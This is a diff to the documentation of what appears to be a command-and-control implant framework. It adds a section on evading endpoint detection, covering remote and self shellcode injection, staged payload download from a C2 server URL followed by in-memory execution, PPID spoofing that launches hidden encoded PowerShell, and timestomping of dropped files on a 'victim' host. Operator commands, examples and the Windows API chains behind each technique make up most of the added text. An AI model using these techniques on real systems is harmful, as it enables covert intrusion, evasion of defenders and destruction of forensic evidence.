@@ -22,8 +22,9 @@
 | 10 | [Queue Management](#10-queue-management) |
 | 11 | [Server & Logs](#11-server--logs) |
 | 12 | [Level 1 Evasion](#12-level-1-evasion) |
-| 13 | [Build Profiles](#13-build-profiles) |
-| 14 | [Quick Reference](#14-quick-reference) |
+| 13 | [Level 2 Evasion — EDR-Aware](#13-level-2-evasion--edr-aware) |
+| 14 | [Build Profiles](#14-build-profiles) |
+| 15 | [Quick Reference](#15-quick-reference) |
 
 ---
 
@@ -571,7 +572,177 @@ operator ads exec 7d019eb7 "C:\Users\Public\notes.txt:update.js"
 
 ---
 
-## 13. Build Profiles
+## 13. Level 2 Evasion — EDR-Aware
+
+Level 2 techniques target EDR behavioral detection: process injection bypasses AV scanning of executables, PPID spoofing defeats parent-chain heuristics, and timestomping removes forensic timestamps. All payloads travel base64-encoded over the existing C2 channel and are never written to disk.
+
+---
+
+### 13.1 Process Injection — Remote
+
+Injects shellcode into a running process on the agent host. Two methods:
+
+| Method | API | Noise | Notes |
+|--------|-----|-------|-------|
+| `crt` | `CreateRemoteThread` | Loud | Default; most reliable |
+| `apc` | `QueueUserAPC` | Quiet | Executes only when a thread enters alertable wait (e.g. SleepEx) |
+
+**Operator command**
+```
+inject remote <agent-id> --pid <pid> --file <sc.bin> [--method crt|apc] [--wait] [--timeout N]
+```
+
+**Examples**
+```bash
+# CRT injection into notepad (default)
+inject remote 7d019eb7 --pid 4821 --file /tmp/met_x64.bin
+
+# APC injection, wait for result
+inject remote 7d019eb7 --pid 4821 --file /tmp/met_x64.bin --method apc --wait
+
+# Short agent ID prefix works
+inject remote 7d01 --pid 4821 --file /tmp/met_x64.bin --method apc --wait --timeout 120
+```
+
+**What happens on the agent:**
+1. Base64 payload decoded in memory
+2. `VirtualAllocEx` allocates RWX region in target process
+3. `WriteProcessMemory` copies shellcode
+4. CRT: `CreateRemoteThread` at shellcode address
+5. APC: enumerate all threads via `CreateToolhelp32Snapshot`, call `QueueUserAPC` on each
+
+---
+
+### 13.2 Fileless In-Memory Execution (inject self)
+
+Executes shellcode inside the **agent's own process** — no new process spawned, nothing written to disk.
+
+```
+inject self <agent-id> --file <sc.bin> [--wait] [--timeout N]
+```
+
+**Examples**
+```bash
+inject self 7d019eb7 --file /tmp/met_x64.bin
+inject self 7d019eb7 --file /tmp/met_x64.bin --wait --timeout 120
+```
+
+**Execution flow:**
+1. `VirtualAlloc` with PAGE_EXECUTE_READWRITE in current process
+2. `WriteProcessMemory` copies shellcode
+3. `syscall.SyscallN(addr)` transfers execution — synchronous, no new thread
+
+> **Note:** The agent goroutine blocks until shellcode returns. Use a staged loader that immediately returns for long-running sessions.
+
+---
+
+### 13.3 Staged Payload Delivery
+
+Downloads a shellcode payload from a URL on the C2 network **server-side** (or any reachable URL) and injects it in one command. The payload never touches disk on the agent.
+
+```
+staged <agent-id> <url> [--method self|crt|apc] [--pid <pid>] [--wait] [--timeout N]
+```
+
+**Methods**
+
+| Flag | Behavior |
+|------|----------|
+| `self` | Execute in agent's own process (default) |
+| `crt` | Inject into `--pid` via CreateRemoteThread |
+| `apc` | Inject into `--pid` via QueueUserAPC |
+
+**Examples**
+```bash
+# Fileless exec from internal C2 web server
+staged 7d019eb7 http://10.10.10.1:8080/met.bin
+
+# Remote inject via APC
+staged 7d019eb7 http://10.10.10.1:8080/met.bin --method apc --pid 5124 --wait
+
+# Wait for confirmation
+staged 7d019eb7 http://10.10.10.1:8080/met.bin --method self --wait --timeout 120
+```
+
+**Flow:** Operator CLI fetches the payload → encodes base64 → sends to C2 API → agent decodes and executes in-memory.
+
+---
+
+### 13.4 PPID Spoofing
+
+Spawns a new process on the agent with a **spoofed parent PID**. EDR tools and Sysmon see the child as belonging to the specified parent, breaking process-chain detection.
+
+```
+inject ppid <agent-id> <exe> [--ppid <pid>|--ppid-name <name>] [--args "..."] [--wait]
+```
+
+**Examples**
+```bash
+# Spawn cmd.exe as child of explorer.exe (looks like user-initiated)
+inject ppid 7d019eb7 "cmd.exe" --ppid-name "explorer.exe"
+
+# Spawn PowerShell hidden, parented to svchost
+inject ppid 7d019eb7 "powershell.exe" --ppid-name "svchost.exe" \
+    --args "-NoP -W Hidden -Enc <base64>"
+
+# Explicit PID
+inject ppid 7d019eb7 "cmd.exe" --ppid 812
+```
+
+**Windows API chain:**
+```
+InitializeProcThreadAttributeList
+→ UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
+→ CreateProcess(EXTENDED_STARTUPINFO_PRESENT)
+```
+
+---
+
+### 13.5 Timestomping
+
+Changes a file's MACE timestamps (Modified, Accessed, Created, Entry) to defeat forensic timeline analysis. By default copies timestamps from `kernel32.dll` so the file appears to be a long-standing system file.
+
+```
+timestomp <agent-id> <target-file> [--ref <reference>] [--time <RFC3339>] [--wait]
+```
+
+**Examples**
+```bash
+# Default: copy timestamps from kernel32.dll
+timestomp 7d019eb7 "C:\Users\victim\drop.exe"
+
+# Copy from a reference file
+timestomp 7d019eb7 "C:\drop.exe" --ref "C:\Windows\explorer.exe" --wait
+
+# Set explicit timestamp
+timestomp 7d019eb7 "C:\drop.exe" --time 2019-03-15T08:30:00Z --wait
+```
+
+**Windows API chain:**
+```
+CreateFile(FILE_WRITE_ATTRIBUTES)
+→ GetFileTime (from ref file)
+→ SetFileTime (on target)
+```
+
+---
+
+### 13.6 Technique Comparison (Level 1 vs Level 2)
+
+| Technique | Detection Surface | EDR Trigger |
+|-----------|------------------|-------------|
+| L1: cmd.exe | Command line logging | None |
+| L1: wmic | Parent chain broken | Moderate |
+| L1: ADS exec | Script from ADS | High (Sysmon event 15) |
+| L2: CRT inject | Memory alloc + remote thread | High |
+| L2: APC inject | Memory alloc only | Medium |
+| L2: inject self | Single alloc, no new thread | Medium |
+| L2: PPID spoof | Unusual parent-child chain bypassed | Low |
+| L2: Timestomp | File metadata | Post-compromise only |
+
+---
+
+## 14. Build Profiles
 
 Profiles are YAML files in `builder/profiles/`. Pass `--profile <name>` to the build script or generator to bake the settings in at compile time.
 
@@ -624,7 +795,7 @@ garble version
 
 ---
 
-## 14. Quick Reference
+## 15. Quick Reference
 
 ```
 AGENTS
